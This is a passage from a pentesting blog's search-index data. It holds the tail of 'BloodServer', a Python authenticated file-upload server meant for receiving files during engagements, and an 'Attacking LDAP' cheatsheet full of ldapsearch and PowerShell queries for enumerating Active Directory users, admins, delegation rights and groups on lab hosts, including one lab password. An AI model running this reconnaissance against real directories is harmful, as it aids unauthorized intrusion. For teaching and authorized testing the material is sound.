import urlparse import random import string import threading import time # Configure logging to track server activities logging.basicConfig(level=logging.INFO, format=\u0026#39;%(asctime)s - %(levelname)s - %(message)s\u0026#39;) def generate_password(length=8): \u0026#34;\u0026#34;\u0026#34;Generate a random password of specified length\u0026#34;\u0026#34;\u0026#34; characters = string.ascii_letters + string.digits + string.punctuation return \u0026#39;\u0026#39;.join(random.choice(characters) for _ in range(length)) class AuthHandler(http.server.SimpleHTTPRequestHandler): def __init__(self, *args, **kwargs): # Extract username and password from kwargs, or use defaults self.username = kwargs.pop(\u0026#39;username\u0026#39;, \u0026#39;admin\u0026#39;) self.password = kwargs.pop(\u0026#39;password\u0026#39;, generate_password()) super().__init__(*args, **kwargs) def do_AUTHHEAD(self): \u0026#34;\u0026#34;\u0026#34;Send authentication request header\u0026#34;\u0026#34;\u0026#34; self.send_response(401) self.send_header(\u0026#39;WWW-Authenticate\u0026#39;, \u0026#39;Basic realm=\u0026#34;Test\u0026#34;\u0026#39;) self.send_header(\u0026#39;Content-type\u0026#39;, \u0026#39;text/html\u0026#39;) self.end_headers() def do_POST(self): \u0026#34;\u0026#34;\u0026#34;Handle POST requests (file uploads)\u0026#34;\u0026#34;\u0026#34; # Check for authentication auth = self.headers.get(\u0026#39;Authorization\u0026#39;) if auth is None: self.do_AUTHHEAD() self.wfile.write(b\u0026#39;No auth header received\u0026#39;) return elif not self.authenticate(auth): self.do_AUTHHEAD() self.wfile.write(b\u0026#39;Invalid credentials\u0026#39;) return try: # Read and process the uploaded file content_length = int(self.headers[\u0026#39;Content-Length\u0026#39;]) post_data = self.rfile.read(content_length) parsed_path = urlparse(self.path) path = parsed_path.path.lstrip(\u0026#39;/\u0026#39;) if not path: path = \u0026#39;uploaded_file\u0026#39; # Default filename if none provided # Ensure the path is safe (prevent directory traversal) path = os.path.basename(path) # Save the uploaded file with open(path, \u0026#39;wb\u0026#39;) as file: file.write(post_data) # Send success response self.send_response(200) self.send_header(\u0026#39;Content-type\u0026#39;, \u0026#39;text/plain\u0026#39;) self.end_headers() success_message = f\u0026#34;File received and saved successfully: {path} ({content_length} bytes)\u0026#34; self.wfile.write(success_message.encode(\u0026#39;utf-8\u0026#39;)) # Log the successful upload logging.info(success_message) print(success_message) # Print to console as well except Exception as e: # Handle and log any errors error_message = f\u0026#34;Error processing request: {str(e)}\u0026#34; logging.error(error_message) print(error_message) # Print to console as well self.send_error(500, error_message) def do_GET(self): \u0026#34;\u0026#34;\u0026#34;Handle GET requests\u0026#34;\u0026#34;\u0026#34; # Check for authentication auth = self.headers.get(\u0026#39;Authorization\u0026#39;) if auth is None: self.do_AUTHHEAD() self.wfile.write(b\u0026#39;No auth header received\u0026#39;) elif self.authenticate(auth): self.send_response(200) self.send_header(\u0026#39;Content-type\u0026#39;, \u0026#39;text/html\u0026#39;) self.end_headers() self.wfile.write(b\u0026#34;Server is running\u0026#34;) else: self.do_AUTHHEAD() self.wfile.write(b\u0026#39;Invalid credentials\u0026#39;) def authenticate(self, auth_header): \u0026#34;\u0026#34;\u0026#34;Authenticate the user\u0026#34;\u0026#34;\u0026#34; auth_decoded = base64.b64decode(auth_header.split()[1]).decode(\u0026#39;ascii\u0026#39;) username, password = auth_decoded.split(\u0026#39;:\u0026#39;) return username == self.username and password == self.password class ThreadedHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer): \u0026#34;\u0026#34;\u0026#34;Handle requests in a separate thread.\u0026#34;\u0026#34;\u0026#34; def run_server(port=9999, use_https=False, username=\u0026#39;admin\u0026#39;, password=None): \u0026#34;\u0026#34;\u0026#34;Run the server with specified configuration\u0026#34;\u0026#34;\u0026#34; global httpd if password is None: password = generate_password() print(f\u0026#34;Generated password: {password}\u0026#34;) print(f\u0026#34;Username: {username}\u0026#34;) print(f\u0026#34;Password: {password}\u0026#34;) handler = lambda *args, **kwargs: AuthHandler(*args, username=username, password=password, **kwargs) if use_https: # Set up HTTPS server if not os.path.exists(\u0026#39;server.pem\u0026#39;): os.system(\u0026#39;openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes -subj \u0026#34;/CN=localhost\u0026#34;\u0026#39;) httpd = ThreadedHTTPServer((\u0026#34;\u0026#34;, port), handler) context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER) context.load_cert_chain(\u0026#39;server.pem\u0026#39;) httpd.socket = context.wrap_socket(httpd.socket, server_side=True) logging.info(f\u0026#34;Serving HTTPS on port {port}\u0026#34;) else: # Set up HTTP server httpd = ThreadedHTTPServer((\u0026#34;\u0026#34;, port), handler) logging.info(f\u0026#34;Serving HTTP on port {port}\u0026#34;) # Start the server in a separate thread server_thread = threading.Thread(target=httpd.serve_forever) server_thread.daemon = True server_thread.start() print(\u0026#34;Press \u0026#39;Q\u0026#39; to stop the server.\u0026#34;) while True: if input().strip().lower() == \u0026#39;q\u0026#39;: print(\u0026#34;Stopping the server...\u0026#34;) httpd.shutdown() break time.sleep(0.1) httpd.server_close() print(\u0026#34;Server stopped.\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: # Set up command-line argument parsing parser = argparse.ArgumentParser(description=\u0026#34;Simple secure web server\u0026#34;) parser.add_argument(\u0026#39;-p\u0026#39;, \u0026#39;--port\u0026#39;, type=int, default=9999, help=\u0026#34;Port to run the server on (default: 9999)\u0026#34;) parser.add_argument(\u0026#39;--https\u0026#39;, action=\u0026#39;store_true\u0026#39;, help=\u0026#34;Enable HTTPS\u0026#34;) parser.add_argument(\u0026#39;-u\u0026#39;, \u0026#39;--username\u0026#39;, type=str, default=\u0026#39;admin\u0026#39;, help=\u0026#34;Username for authentication\u0026#34;) parser.add_argument(\u0026#39;--password\u0026#39;, type=str, help=\u0026#34;Password for authentication\u0026#34;) args = parser.parse_args() # Run the server with provided arguments run_server(port=args.port, use_https=args.https, username=args.username, password=args.password) Security Considerations While BloodServer provides basic security features, it\u0026rsquo;s important to note:\nIt\u0026rsquo;s designed for temporary use in controlled environments only. Always use HTTPS in production environments. The default self-signed certificate is not suitable for production. Use a proper SSL certificate from a trusted CA. Regularly update the authentication credentials. Be cautious when using commands that ignore SSL certificate errors, as they bypass security checks. Responsible Use BloodServer is a tool for professional penetration testers and should only be used in environments where you have explicit permission. Misuse of this tool could lead to security vulnerabilities if deployed in inappropriate settings.\nConclusion BloodServer aims to fill a niche need for penetration testers who require a quick, secure file transfer solution during engagements. While it\u0026rsquo;s a powerful tool in the right hands, always remember the importance of responsible use and adherence to security best practices.\nFeel free to contribute to the project or report issues on my GitHub repository .\nHappy hacking!\nBloodstiller\n", 
        "url": "http:\/\/localhost:1313\/tools\/bloodserver\/"
    },
    
    "http:\/\/localhost:1313\/tags\/server\/": {
        "title": "Server",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/server\/"
    },
    
    "http:\/\/localhost:1313\/cheatsheets\/ldap-cheatsheet\/": {
        "title": "Attacking LDAP: Deep Dive \u0026 Cheatsheet",
        "tags": ["Active Directory","Windows","LDAP","CheatSheet","Pentesting",],
        "content": " +Protocol for accessing and managing directory information, widely used in enterprise environments.+ LDAP is an open-source and cross-platform protocol used for authentication against various directory services (such as AD). AD stores user account information and security information such as passwords and facilitates sharing this information with other devices on the network. LDAP is the language that applications use to communicate with other servers that also provide directory services. In other words, LDAP is a way that systems in the network environment can \u0026ldquo;speak\u0026rdquo; to AD. LDAP Overview: Ports: 389, 636\nLDAP (Lightweight Directory Access Protocol)\nThe two most popular implementations of LDAP:\nOpenLDAP Active Directory Overview:\nProtocol for accessing and managing directory information Widely used in enterprise environments Operates over TCP/IP Directory Services:\nHierarchical organization of resources Includes users, groups, devices, and other objects A directory is a hierarchical data store that contains information about network resources such as users, groups, computers, printers, and other devices. Operations:\nSearch: Query directory objects Add: Insert new records Delete: Remove existing records Modify: Update attributes of records Authentication:\nAnonymous Simple (clear-text) SASL (more secure methods) LDAP Data Model:\nDIT (Directory Information Tree) DN (Distinguished Name) Attributes: Descriptive elements like username, email, etc. Common Implementations:\nMicrosoft\u0026rsquo;s Active Directory OpenLDAP Novell\u0026rsquo;s eDirectory Security Concerns:\nClear-text password vulnerabilities LDAP injection attacks Use LDAPS for secure connections Penetration Testing Relevance:\nEnumeration of user accounts and groups Information gathering for privilege escalation Note: Always perform activities like penetration testing with proper authorization.\nLDAP Requests \u0026amp; Responses (how a session works): Model Overview:\nLDAP uses a client-server architecture. Clients communicate with servers using LDAP messages, encoded in ASN.1 and transmitted over TCP/IP. Supports various requests like bind, unbind, search, compare, add, delete, modify, etc. LDAP requests \u0026amp; responses:\nLDAP requests are messages that clients send to servers to perform operations on data stored in a directory service. An LDAP request is comprised of several components:\nLDAP Requests: Session Connection: Clients connect via an LDAP port (commonly 389 or 636). Request Type: Specifies the operation (e.g., bind, search). Request Parameters: The client provides additional information for the request, such as the distinguished name (DN) of the entry to be accessed or modified, the scope and filter of the search query, the attributes and values to be added or changed, etc Request ID: Unique identifier for matching requests with responses. Once the server receives the request, it processes it and sends back a response message that includes several components:\nLDAP Responses: Response Type: Indicates the operation that was performed in response to the requests. Result Code: Indicates success or failure and the reason. Matched DN: Returns the DN of the closest matching entry, if applicable. Referral: Provides a URL to another server with potentially more relevant information (if applicable). Response Data: Additional data related to the response, such as attributes and values of an entry. After receiving and processing the response, the client disconnects from the LDAP port.\n+Example+:\nConsider a simple example where a client wants to search for a user\u0026rsquo;s information in the directory: Client sends a search request:\nConnects to the LDAP server on port 389. Specifies request type: search. Provides search parameters: DN=\u0026quot;cn=John Doe,ou=users,dc=example,dc=com\u0026quot;, scope=\u0026quot;sub\u0026quot;, filter=\u0026quot;(objectClass=person)\u0026quot;. Provides a request ID. LDAP Server processes the request:\nSearches the directory for entries matching the criteria. Constructs a response message with the result. Server sends back a response:\nResponse type: searchResult. Result code: success (if the entry is found) or an error code. Referral: (not applicable in this case) Response data: Attributes and values of \u0026ldquo;John Doe\u0026rdquo; if the entry is found. Client processes the response:\nParses the attributes and values of \u0026ldquo;John Doe\u0026rdquo;. Disconnects from the server. Diagram to understand visually:\n[Client] | |---[Connect to LDAP Server on Port 389/636] | |---[Send LDAP Request] | | | |--[Request Type: e.g., Search] | |--[Request Parameters: DN, Scope, Filter] | |--[Request ID: Unique Identifier] | [LDAP Server] | |---[Process Request] | | | |--[Perform Operation: e.g., Search Directory] | |---[Send LDAP Response] | |--[Response Type: e.g., SearchResult] |--[Result Code: Success or Error] |--[Matched DN: Closest Matching Entry] |--[Referral: URL to Another Server (if applicable)] |--[Response Data: Attributes and Values (if found)] | [Client] | |---[Process Response] | |---[Disconnect] LDAP AD Authentication: LDAP is set up to authenticate credentials against AD using a \u0026ldquo;BIND\u0026rdquo; operation to set the authentication state for an LDAP session. LDAP authentication messages are sent in cleartext by default so anyone can sniff out LDAP messages on the internal network. It is recommended to use TLS encryption or similar to safeguard this information in transit. _\nThere are two types of LDAP authentication. Simple Authentication:\nSimple authentication means that a username and password create a BIND request to authenticate to the LDAP server. Simple authentication methods are as follows: Anonymous authentication Unauthenticated authentication Username/password authentication. SASL Authentication:\nSecurity Layer (SASL) framework uses other authentication services. It can also provide further security due to the separation of authentication methods from application protocols. SASL Authentication example:(please note there are more methods of SASL Authentication): Kerberos , to bind to the LDAP server and then uses this authentication service to authenticate to LDAP. The LDAP server uses the LDAP protocol to send an LDAP message to the authorization service which initiates a series of challenge/response messages resulting in either successful or unsuccessful authentication. OpenLDAP: https://www.openldap.org/ Definition:\nOpenLDAP is an open-source implementation of the Lightweight Directory Access Protocol (LDAP). Used for directory services to store and manage sensitive information like user credentials, network resources, and permissions. How It Works:\nUses a hierarchical data structure (Directory Information Tree, DIT). Supports a variety of operations like add, delete, modify, and search. Protocols Involved:\nLDAP LDAP over SSL/TLS (LDAPS) SASL for advanced authentication Importance in Cybersecurity:\nUsed as a central repository for user credentials. Security measures like ACLs (Access Control Lists) can be implemented. Application in Penetration Testing:\nTest for misconfigurations in ACLs. Check for weak encryption or lack of signing in communications. Platform-Specific Implementations:\nMost often used in Unix and Linux environments. Can be integrated with other platforms like Windows for cross-platform directory services. Configuration:\nMain configuration file is usually slapd.conf or under etc/openldap/slapd.d in newer versions. ACLs, logging, and other settings are configurable. Limitations:\nComplexity can lead to misconfiguration. Security features must be manually enabled and configured. LDAP signing: Definition:\nLDAP Signing is a security feature that helps prevent man-in-the-middle attacks. It ensures that LDAP (Lightweight Directory Access Protocol) packets are genuine and unaltered during transmission. How It Works\nThe LDAP server signs all traffic sent to clients. Clients validate the signature to confirm data integrity. Protocols Involved:\nSASL (Simple Authentication and Security Layer) mechanisms can be used. LDAP over SSL/TLS also can enforce packet signing. Importance in Cybersecurity:\nPrevents unauthorized modification of data during transmission. Increases trustworthiness of LDAP communications. Application in Penetration Testing:\nTest to ensure LDAP signing is enabled. Check for vulnerabilities that may bypass or exploit unsigned LDAP traffic. Platform-Specific Implementations:\nMicrosoft AD (Active Directory) often implements this. OpenLDAP and other directory services can also enforce LDAP signing. Configuration:\nOften set via Group Policy on Windows systems. For Linux, configurations are generally in the LDAP configuration files. Limitations:\nIncreases computational overhead. May not encrypt data, just signs it for integrity. Use with encryption for enhanced security. LDAP Bind Request: A bind request consists of 3 elements:\nThe LDAP protocol the clients wants to use: This is represented by an integer value. The DN of the client/user to authentication: For an Anonymous Bind it would be empty. It would also typically be empty for SASL Authentication as SASL uses encoded credentials The credentials the client/user uses to authentication: For simple authentication this is the password for the DN specified in part 2. For Anonymous bind the string would be empty, for SASL authentication this is an encoded value. LDAP Anonymous Bind: LDAP anonymous binds allow us to retrieve information from the domain, such as:\nA list of all users A list of all groups A list of all computers. User account attributes. The domain password policy. Enumerate users who are susceptible to AS-REPRoasting. Passwords stored in the description fields Linux hosts running open-source versions of LDAP and Linux vCenter appliances are often configured to allow anonymous binds.\nLDAP Filters: We can use LDAP Filters with tools like:\nldapsearch Active Directory Powershell Module PowerShell + other powershell cmdlets. LDAP filters must have one or more criteria.\nIf more than one criteria exist, they can be concatenated together using logical AND \u0026amp; or OR | operators. Operators are always placed in the front of the operands: This is due to it using the Polish Notation convention. Definition of the syntax definition for the filter:\nhttps://datatracker.ietf.org/doc/html/rfc4515 Guide on building filters:\nhttps://learn.microsoft.com/en-us/archive/technet-wiki/5392.active-directory-ldap-syntax-filters LDAP Filter Operands: LDAP Filter Operands:\nFilter rules are enclosed in parentheses and can be grouped by surrounding the group in parentheses and using one of the following comparison operators:\nAND (\u0026amp;)\nSyntax: (\u0026amp;amp;(condition1)(condition2)) Description: Combines multiple conditions with a logical AND. All conditions must be true for a match. OR (|)\nSyntax: (|(condition1)(condition2)) Description: Combines multiple conditions with a logical OR. At least one condition must be true for a match. NOT (!)\nSyntax: (!(condition)) Description: Negates a condition. The condition must be false for a match. Some examples AND *and* ~OR operations are as follows:\nAND Operations:\nOne criteria:\nCommand: (\u0026amp;amp; (..C1..) (..C2..)) +Example+: (\u0026amp;amp;(ObjectClass=user)(cn=nathan\\*)) +Note+: Searches for users who\u0026rsquo;s name starts nathan More than two criteria:\nCommand: (\u0026amp;amp; (..C1..) (..C2..) (..C3..)) +Example+: (\u0026amp;amp;(ObjectClass=user)(cn=jo\\*)(ou=IT)) +Note+: Searches for users whos name starts with jo* and they are in the OU IT. OR Operations:\nOne criteria:\nCommand: (| (..C1..) (..C2..)) +Example+: (|(ObjectClass=user)(ObjectClass=group)) +Note+: Will return either users or groups. More than two criteria:\nCommand: (| (..C1..) (..C2..) (..C3..)) +Example+: (|(ObjectClass=user)(ObjectClass=group)(ou=IT)) +Note+: Searches for users or groups that are in the OU IT. Nested Operations:\nNested Operators: Command: (|(\u0026amp;amp; (..C1..) (..C2..))(\u0026amp;amp; (..C3..) (..C4..))) +Example+: (|(\u0026amp;amp; (ObjectClass=user)(cn=jo\\*)) (\u0026amp;amp; (ObjectClass=group)(cn=sql\\*))) +Note+: Translates to \u0026quot;(C1 AND C2) OR (C3 AND C4)\u0026quot; Searches for users who\u0026rsquo;s names start with jo or groups who\u0026rsquo;s name start with \u0026ldquo;sql\u0026rdquo; Examples of these being paired with ldapsearch:\nWe can pair search terms with filters to narrow down information even more. If I am enumerating a domain and a I know there is a user I want to go after called \u0026ldquo;Nathan\u0026rdquo; I can craft the following queries to enumerate them further. ldapsearch -H ldap://10.129.204.54 -x -b \u0026#34;DC=sugarape,DC=local\u0026#34; \u0026#39;(\u0026amp;(ObjectClass=user)(cn=nathan*))\u0026#39; logoncount ldapsearch -H ldap://10.129.204.54 -x -b \u0026#34;DC=sugarape,DC=local\u0026#34; \u0026#39;(\u0026amp;(ObjectClass=user)(cn=nathan*))\u0026#39; sAMAccountName ldapsearch -H ldap://10.129.204.54 -x -b \u0026#34;DC=sugarape,DC=local\u0026#34; \u0026#39;(\u0026amp;(ObjectClass=user)(cn=nathan*))\u0026#39; LDAP Logical Operators: When writing an LDAP search filter, we need to specify a rule requirement for the LDAP attribute in question (i.e. \u0026ldquo;(displayName=william)\u0026rdquo;). The following rules can be used to specify our search criteria: Operator Meaning Description = Equality Operator Checks for exact match between attribute and value. ~= Approximately equal to Finds entries where the attribute is approximately equal to the given value. \u0026gt;= Greater than or equal to Finds entries where the attribute value is greater than or equal to the given value. \u0026lt;= Less than or equal to Finds entries where the attribute value is less than or equal to the given value. =* Presence Test Checks if an attribute is present, regardless of its value. +Examples of Operators in use+:\nOperator Rule Example Equal to (attribute=123) (\u0026amp;(objectclass=user)(displayName=Smith)) Not equal to (!(attribute=123)) (!(objectClass=group)) Present (attribute=*) (department=*) Not present (!(attribute=*)) (!homeDirectory=*) Greater than (attribute\u0026gt;=123) (maxStorage\u0026gt;=100000) Less than (attribute\u0026lt;=123) (maxStorage\u0026lt;=100000) Approximate match (attribute~=123) (sAMAccountName~=Jason) Wildcards (attribute=*A) (givenName=*Sam) List of user attributes: https://docs.bmc.com/docs/fpsc121/ldap-attributes-and-associated-fields-495323340.html LDAP Filter Item Types: Type Meaning = Simple =* Present =something* Substring Extensible varies depending on type LDAP Filter Escaped Characters: These must be escaped when making queries Character Represented as Hex * \\2a ( \\28 ) \\29 \\ \\5c NUL \\00 Object Identifiers OID\u0026rsquo;s: Overview: Unique string of numbers used to identify directory objects and attributes Hierarchical structure with dot-separated decimal numbers (e.g., 1.2.840.113556.1.4.803) Ensures standardization and avoids naming conflicts Commonly used in LDAP schemas and search filters Structure: Each number in the sequence represents a node in a hierarchical tree The full OID represents the path from the root to a specific leaf node Earlier numbers indicate broader categories, later numbers specify more precise items Example of the tree structure: Usage Example: Breaking down the LDAP query: userAccountControl:1.2.840.113556.1.4.803:=8192\nuserAccountControl: The attribute being queried 1.2.840.113556.1.4.803: OID for a specific matching rule (bitwise AND) :=: Equality operator in LDAP 8192: Decimal value for the specific flag being queried (SERVER_TRUST_ACCOUNT) This query structure allows for precise and standardized searches within LDAP directories.\nSee LDAP Filter Using Object Identifiers OID\u0026rsquo;s: Additional Resources: +Comprehensive List of OID\u0026rsquo;s+ - https://ldap.com/ldap-oid-reference-guide/ https://en.wikipedia.org/wiki/Object_identifier https://learn.microsoft.com/en-us/windows/win32/adsi/search-filter-syntax LDAP Filter Using Object Identifiers : Used with OID\u0026rsquo;s and UAC bitmasks to filter for certain things. Useful when Living off the land in AD:\nhttps://learn.microsoft.com/en-us/windows/win32/adsi/search-filter-syntax And Operator:\nMatching rule OID: 1.2.840.113556.1.4.803 String identifier: LDAP_MATCHING_RULE_BIT_AND Description: A match is found only if all bits from the attribute match the value. This rule is equivalent to a bitwise AND operator. +Example Query+: (\u0026amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2)) This will return all administratively disabled user accounts Combined with Active Directory PowerShell Module we can shorten it to: +Example+: Get-ADUser -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=2)' | select name Or Operator:\nMatching rule OID: 1.2.840.113556.1.4.804 String identifier: LDAP_MATCHING_RULE_BIT_OR Description: A match is found if any bits from the attribute match the value. This rule is equivalent to a bitwise OR operator. +Example Query+: (member:1.2.840.113556.1.4.1941:=CN=Nathan Barley,OU=Network Ops,OU=IT,OU=Employees,DC=SUGARAPE,DC=LOCAL) This matching rule will find all groups that the user Nathan Barley (\u0026quot;CN=Nathan Barley,OU=Network Ops,OU=IT,OU=Employees,DC=SUGARAPE,DC=LOCAL\u0026quot;) is a member of. +Example+: Get-ADGroup -LDAPFilter '(member:1.2.840.113556.1.4.1941:=CN=Nathan Barley,OU=Network Ops,OU=IT,OU=Employees,DC=SUGARAPE,DC=LOCAL)' Special Chain Operator:\nMatching rule OID: 1.2.840.113556.1.4.1941 String identifier: LDAP_MATCHING_RULE_IN_CHAIN Description: This rule is limited to filters that apply to the DN. This is a special \u0026ldquo;extended\u0026rdquo; match operator that walks the chain of ancestry in objects all the way to the root until it finds a match. LDAP Query/Queries: LDAP Search Terms :\nComputer Related LDAP Queries:\nhttps://ldapwiki.com/wiki/Wiki.jsp?page=Active%20Directory%20Computer%20Related%20LDAP%20Query Active Directory User Related Searches:\nhttps://ldapwiki.com/wiki/Wiki.jsp?page=Active%20Directory%20User%20Related%20Searches Active Directory Group Related Searches:\nhttps://ldapwiki.com/wiki/Wiki.jsp?page=Active%20Directory%20Group%20Related%20Searches Guide on building filters:\nhttps://learn.microsoft.com/en-us/archive/technet-wiki/5392.active-directory-ldap-syntax-filters +LDAP Search Terms+ Great Cheat Sheets: https://gist.github.com/jonlabelle/0f8ec20c2474084325a89bc5362008a7 https://social.technet.microsoft.com/wiki/contents/articles/5392.active-directory-ldap-syntax-filters.aspx https://gist.github.com/jonlabelle/0f8ec20c2474084325a89bc5362008a7 +Use these with+:\nldapsearch LDAP Filters: Active Directory PowerShell Module List Domain Functionality Level : ldapsearch -x -H ldap://[[DCIP]] -b \u0026#34;\u0026#34; -s base \u0026#34;objectClass=*\u0026#34; domainFunctionality\u0026#34;\u0026#34; ldapsearch -x -H ldap://10.129.42.188 -b \u0026#34;\u0026#34; -s base \u0026#34;objectClass=*\u0026#34; domainFunctionality\u0026#34;\u0026#34; List User Information: If none of these are what we need we can see other user attributes here: https://docs.bmc.com/docs/fpsc121/ldap-attributes-and-associated-fields-495323340.html List All User Information: Linux: #Ldap Query \u0026#39;(objectClass=user)\u0026#39; or \u0026#39;(\u0026amp;(objectCategory=person))\u0026#39; # Examples Using ldapsearch ldapsearch -x -b \u0026#34;dc=sugarape,dc=local\u0026#34; -H ldap://10.129.95.210 \u0026#39;(objectClass=user)\u0026#39; ldapsearch -x -b \u0026#34;dc=sugarape,dc=local\u0026#34; -H ldap://10.129.95.210 \u0026#39;(\u0026amp;(objectCategory=person))\u0026#39; Windows: #Ldap Query Get-ADObject -LDAPFilter \u0026#39;(\u0026amp;(objectCategory=person))\u0026#39; or \u0026#39;(objectClass=user)\u0026#39; # Examples Using LDAPFilter Get-ADObject -LDAPFilter \u0026#39;(\u0026amp;(objectCategory=person))\u0026#39; Get-ADObject -LDAPFilter \u0026#39;(\u0026amp;(objectCategory=person))\u0026#39; | select name | Measure-Object The last option selects just the name and the pipes it into measure object which gives us the total number of users on the domain: List a specific Users Information: Linux: #Ldap Query \u0026#39;(\u0026amp;(ObjectClass=user)(cn=\u0026lt;name*\u0026gt;))\u0026#39; # Examples Using ldapsearch ldapsearch -x -b \u0026#34;dc=sugarape,dc=local\u0026#34; -H ldap://10.129.95.210 \u0026#39;(\u0026amp;(ObjectClass=user)(cn=nathan*))\u0026#39; +Notes+: - The wildcard * is correct after the name as we want to view all information about that account. - Sometimes we will get output like this (this usually means the account is not found in the directory): - - Where as this account is active and in use by the looks of it: - Windows: #Ldap Query Get-ADObject -LDAPFilter \u0026#39;(\u0026amp;(ObjectClass=user)(cn=\u0026lt;name*\u0026gt;))\u0026#39; # Examples Using LDAPFilter Get-ADObject -LDAPFilter \u0026#39;(\u0026amp;(objectCategory=user)(cn=carol*))\u0026#39; +Note+: This will return all users called Carol, we could further narrow down our search by adding a last name: - '(\u0026amp;(objectCategory=user)(cn=carol smith))' List Users Who have Constrained Delegation Privileges: Linux: #Ldap Query (userAccountControl:1.2.840.113556.1.4.803:=524288) # Examples Using LDAPSearch ldapsearch -D \u0026#34;cn=sugarape-student,dc=sugarape,DC=LOCAL\u0026#34; -w \u0026#39;Academy_student_AD!\u0026#39; -H ldap://10.129.2.174 \u0026#39;(userAccountControl:1.2.840.113556.1.4.803:=524288) Windows: #Ldap Query (userAccountControl:1.2.840.113556.1.4.803:=524288) # Example Using LDAPFilter Get-DomainUser -LDAPFilter \u0026#34;(userAccountControl:1.2.840.113556.1.4.803:=524288)\u0026#34; Users with Administrative Privileges: Linux: #Ldap Query (\u0026amp;(objectClass=user)(adminCount=1)) # Example Using LDAPSearch ldapsearch -x -b \u0026#34;dc=sugarape,dc=local\u0026#34; -H ldap://10.129.95.210 \u0026#39;(\u0026amp;(objectClass=user)(adminCount=1))\u0026#39; Windows: # Example Using LDAPFilter Get-ADObject -LDAPFilter \u0026#39;(\u0026amp;(objectCategory=user)(adminCount=1))\u0026#39; List All administratively disabled accounts.: Linux: #LDAP Query (\u0026amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2)) # Example Using LDAPSearch ldapsearch -x -b \u0026#34;dc=sugarape,dc=local\u0026#34; -H ldap://10.129.95.210 \u0026#39;(\u0026amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))\u0026#39; Windows: Get-ADObject -LDAPFilter \u0026#39;(\u0026amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))\u0026#39; +Note+: Don\u0026rsquo;t pipe into | select samaccountname| it didn\u0026rsquo;t work for me, I think it may be due to the account being disabled, then maybe the sam account is disabled? List User Emails: Linux: #LDAP Query (\u0026amp;(objectClass=user)(mail=*@domain.com)) # Example Using LDAPSearch ldapsearch -x -b \u0026#34;dc=sugarape,dc=local\u0026#34; -H ldap://10.129.95.210 (\u0026amp;(objectClass=user)(mail=*@sugarape.local)) Windows: #LDAP Query (\u0026amp;(objectClass=user)(mail=*@domain.com)) # Example Using LDAPFilter Get-ADObject -LDAPFilter (\u0026amp;(objectClass=user)(mail=*@sugarape.local)) List Group Information: List All Groups: Linux: #LDAP Query (objectClass=group) # Example Using LDAPSearch ldapsearch -H ldap://monteverde.MEGABANK.LOCAL -x -b \u0026#34;DC=MEGABANK,DC=LOCAL\u0026#34; -s sub \u0026#34;(\u0026amp;(objectclass=group))\u0026#34; | grep sAMAccountName: | cut -f2 -d\u0026#34; \u0026#34; Windows: #LDAP Query (\u0026amp;(objectCategory=group)) # Example Using LDAPFilter Get-ADObject -LDAPFilter \u0026#39;(\u0026amp;(objectCategory=group))\u0026#39; | select name | Measure-Object +Note+: The example counts the number of groups too by piping into measure object. List Group Membership of a specific user: Linux: #LDAP Query (\u0026amp;(objectClass=group)(member=CN=John Doe,CN=Users,DC=domain,DC=com)) # Example Using LDAPSearch ldapsearch -x -b \u0026#34;dc=domain,dc=com\u0026#34; -H ldap://10.129.95.210 \u0026#39;(\u0026amp;(objectClass=group)(member=CN=John Doe,CN=Users,DC=domain,DC=com))\u0026#39; Windows: #LDAP Query (\u0026amp;(objectClass=group)(member=CN=John Doe,CN=Users,DC=domain,DC=com) # Example Using LDAPFilter Get-ADObject -LDAPFilter \u0026#39;(\u0026amp;(objectClass=group)(member=CN=John Doe,CN=Users,DC=domain,DC=com)\u0026#39; +Note+: Can\u0026rsquo;t seem to get to work just yet List Members of a Specific Group: Linux: #LDAP Query (\u0026amp;(objectCategory=Person)(sAMAccountName=*)(memberOf=CN=\u0026lt;GroupName\u0026gt;,OU=Groups,DC=[DCNAME],DC=[DCNAME])) # Example Using LDAPSearch ldapsearch -H ldap://monteverde.MEGABANK.LOCAL -x -b \u0026#34;DC=MEGABANK,DC=LOCAL\u0026#34; -s sub \u0026#34;(\u0026amp;(objectCategory=Person)(sAMAccountName=*)(memberOf=CN=Helpdesk,OU=Groups,DC=MEGABANK,DC=LOCAL))\u0026#34; Windows: #LDAP Query (\u0026amp;(objectCategory=Person)(sAMAccountName=*)(memberOf=CN=\u0026lt;GroupName\u0026gt;,OU=Groups,DC=[DCNAME],DC=[DCNAME])) # Example Using LDAPFilter Get-ADObject -LDAPFilter \u0026#34;(\u0026amp;(objectCategory=Person)(sAMAccountName=*)(memberOf=CN=Helpdesk,OU=Groups,DC=MEGABANK,DC=LOCAL))\u0026#34; +Notes+: Signifies no-one is in this group: Users are part of this group. List Computers: Linux: #LDAP Query (objectClass=computer) # Example Using LDAPSearch ldapsearch -x -b \u0026#34;dc=sugarape,dc=local\u0026#34; -H ldap://10.129.95.210 \u0026#39;(objectClass=computer)\u0026#39; Windows: #LDAP Query (objectClass=computer) # Example Using LDAPFilter Get-ADObject -LDAPFilter \u0026#34;(objectClass=computer)\u0026#34; List OU information: List All OU\u0026rsquo;s: Linux: #LDAP Query (objectClass=OrganizationalUnit) # Example Using LDAPSearch ldapsearch -x -b \u0026#34;dc=sugarape,dc=local\u0026#34; -H ldap://10.129.95.210 \u0026#39;(objectClass=OrganizationalUnit)\u0026#39; Windows: #LDAP Query (objectClass=OrganizationalUnit) # Example Using LDAPFilter Get-ADObject -LDAPFilter \u0026#34;(objectClass=OrganizationalUnit)\u0026#34; List Specific OU Information: Linux: #LDAP Query (ou=[OUName]) # Example Using LDAPSearch ldapsearch -x -b \u0026#34;dc=sugarape,dc=local\u0026#34; -H ldap://10.129.95.210 \u0026#39;(ou=Accounting)\u0026#39; Windows: #LDAP Query (ou=[OUName]) # Example Using LDAPFilter Get-ADObject -LDAPFilter \u0026#34;(ou=Accounting)\u0026#34; List Account Information: List Active Accounts: Linux: #LDAP Query 